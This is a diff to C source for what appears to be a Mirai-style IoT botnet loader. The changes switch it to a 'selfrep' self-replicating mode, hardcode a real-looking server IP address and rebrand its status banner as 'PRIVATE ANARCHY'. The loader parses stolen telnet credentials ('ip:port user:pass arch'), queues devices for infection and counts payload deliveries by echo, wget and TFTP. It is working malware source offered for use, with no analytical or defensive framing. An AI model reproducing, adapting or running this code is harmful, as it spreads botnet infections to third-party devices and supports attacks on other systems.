@@ -16,7 +16,7 @@
 
 static void *stats_thread(void *);
 
-char *id_tag = "loader";
+char *id_tag = "selfrep";
 
 static struct server *srv;
 
@@ -30,13 +30,13 @@ int main(int argc, char **args)
 
     addrs_len = 1;
     addrs = calloc(4, sizeof(ipv4_t));
-    addrs[0] = inet_addr("1.1.1.1");
-
+    addrs[0] = inet_addr("91.122.37.169");
+	
 	if (argc == 2)
     {
         id_tag = args[1];
     }
-	
+
     if(!binary_init())
     {
         return 1;
@@ -67,11 +67,13 @@ int main(int argc, char **args)
         memset(&info, 0, sizeof(struct telnet_info));
         if(telnet_info_parse(strbuf, &info) == NULL)
         {
+            //printf("Failed to parse telnet info: \"%s\" Format -> ip:port user:pass arch\n", strbuf);
         }
         else
         {
             if(srv == NULL)
             {
+                //printf("srv == NULL 2\n");
             }
 
             server_queue_telnet(srv, &info);
@@ -81,6 +83,7 @@ int main(int argc, char **args)
         ATOMIC_INC(&srv->total_input);
     }
 
+    //printf("Hit end of input.\n");
 
     while(ATOMIC_GET(&srv->curr_open) > 0) sleep(1);
 
@@ -94,7 +97,7 @@ static void *stats_thread(void *arg)
     while(TRUE)
     {
         #ifndef DEBUG
-		printf("\033[0;32m danonet\033[1;37m Loader Privat \033[0;32m> \033[1;37m[\033[0;32m%d\033[1;37m]\tConns:\033[0;32m %d\t\033[1;37mLogins:\033[0;32m %d\t\033[1;37mSucces:\033[0;32m %d\n",
+		printf("\x1b[0;36m[\x1b[0;37m%ds\x1b[0;36m] \x1b[0;31m(\x1b[0;33mPRIVATE\x1b[0;31m) \x1b[1;34mANARCHY \x1b[0;37m- \x1b[1;34mSelfrep: [\x1b[0;37m%d\x1b[0;36m] Logins: \x1b[0;36m[\x1b[0;37m%d\x1b[0;36m] Ran: \x1b[0;36m[\x1b[0;37m%d\x1b[0;36m] \x1b[0;37m-> Echoes: \x1b[0;36m[\x1b[0;37m%d\x1b[0;36m] Wgets: \x1b[0;36m[\x1b[0;37m%d\x1b[0;36m] TFTPs: \x1b[0;36m[\x1b[0;37m%d\x1b[0;36m]\x1b[0;37m\n",
 		seconds++, ATOMIC_GET(&srv->curr_open),  ATOMIC_GET(&srv->total_logins), ATOMIC_GET(&srv->total_successes),
                ATOMIC_GET(&srv->total_echoes), ATOMIC_GET(&srv->total_wgets), ATOMIC_GET(&srv->total_tftps));
         #endif
